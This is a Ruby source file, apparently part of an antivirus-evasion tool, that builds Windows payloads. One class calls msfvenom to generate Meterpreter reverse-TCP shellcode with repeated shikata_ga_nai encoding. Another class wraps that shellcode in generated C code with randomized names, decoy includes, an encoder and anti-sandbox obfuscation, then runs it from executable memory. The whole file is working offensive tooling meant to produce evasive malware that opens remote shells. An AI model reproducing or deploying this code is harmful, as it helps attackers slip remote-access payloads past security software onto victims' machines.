#!/usr/bin/env ruby
# -*- coding: binary -*-
# Code by Green-m
# Test  on ruby 2.3.3
$LOAD_PATH.unshift(File.dirname(__FILE__))
require 'encoder'
require 'antisandbox'

class PayloadMaker

    def initialize(shellcode,encoder=true)
        @shellcode = shellcode
        @encoder = encoder
    end

    def fake_includes

        @@fake_includes_all = ["#include <ctype.h>","#include <time.h> ","#include <math.h>","#include <signal.h>","#include <stdarg.h>",
                         "#include <limits.h>","#include <assert.h>","#include <stdio.h>","#include <stdlib.h>","#include <string.h>"]

        fake_includes = []
        @@fake_includes_all.length.times do 
            fake_includes << @@fake_includes_all.sample
        end
        fake_includes.uniq!
    end

    def random_memory
        # random memory size 
        memory_size = random_number(@shellcode.length..100000)

    end

    def compile_function1
        shellcode = @shellcode
        rand_buf = random_funcname()
        rand_name1 = random_funcname()
        rand_name2 = random_funcname()
        rand_name3 = random_funcname()
        rand_name4 = random_funcname()
        encoded_code = shellcode
        decoded_code = ""

        encoded_code,decoded_code,rand_buf = Encoder::Mixed.new(shellcode).generate if @encoder

        shellcode.sub!('unsigned char buf[] = ',"unsigned char #{rand_buf}[] = ")
        string_mod_functions = ["LPVOID #{rand_name1};\n","HANDLE #{rand_name2};\n","SIZE_T #{rand_name3};\n","BOOL #{rand_name4} = FALSE;\n"].shuffle!.join()


        # add includes
        code = "#include <windows.h>\n"
        code << fake_includes.join("\n")

        # add shellcode 
        code << "\n" + encoded_code + "\n"

  
        # main function
        code << "int main(){\n"

        
        # anti sandbox obfuscate code
        output_status "Adding anti sandbox obfuscate code."
        code << AntiSandBox::random_obfuscate


        # decode shellcode
        code <<  decoded_code + "\n"

        # Declare variables
        code << string_mod_functions

        # run shellcode functions
        code << "#{rand_name2} = GetCurrentProcess();\n"
        code << "#{rand_name1} = VirtualAllocEx(#{rand_name2}, NULL, sizeof(#{random_memory}), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
        code << "#{rand_name4} = WriteProcessMemory(#{rand_name2}, #{rand_name1}, (LPCVOID)&#{rand_buf}, sizeof(#{rand_buf}), &#{rand_name3});\n"
        code << "((void(*)())#{rand_name1})();\n"
        code << "return 0;\n"
        code << "}"

    end

    def compile_random
        compile_functions = []
        self.methods.each {|x|
            compile_functions << x if x.to_s.include?'compile_function'
        }

        output_status "Generating sample code."
        send(compile_functions.sample)
    end

end


class MsfRunner
    def initialize(payload='windows/meterpreter/reverse_tcp',host='127.0.0.1',port='4444',others='',debug=false)
        @payload = payload 
        @host = host 
        @port = port  
        @others = others
        @debug = debug
        #@platform = platform
    end

    def get_encoder

        encoder_array = ["x86/shikata_ga_nai"]

    end


    def run
        encoder_array = get_encoder

        # debug
        #msfstring =  "msfvenom -p #{@payload}  lhost=#{@host}  lport=#{@port} #{@other} -f c -e x86/jmp_call_additive -i #{random_number(10..15)} "

        msfstring =  "msfvenom -p #{@payload}  lhost=#{@host}  lport=#{@port} #{@other} -f c -e #{encoder_array[0]} -i #{random_number(20..30)}"

        output_status "Retrieve shellcode from metasploit.."
        output_line msfstring if @debug
        
        begin
            stdin, stdout, stderr = Open3.popen3(msfstring) 
        rescue Exception => e
            output_bad "some error occured when running metasploit"
            output_bad e.message
            exit
        end

        shellcode = stdout.read

        # payload size
        output_line stderr.read.lines[-2]

        shellcode
    end

end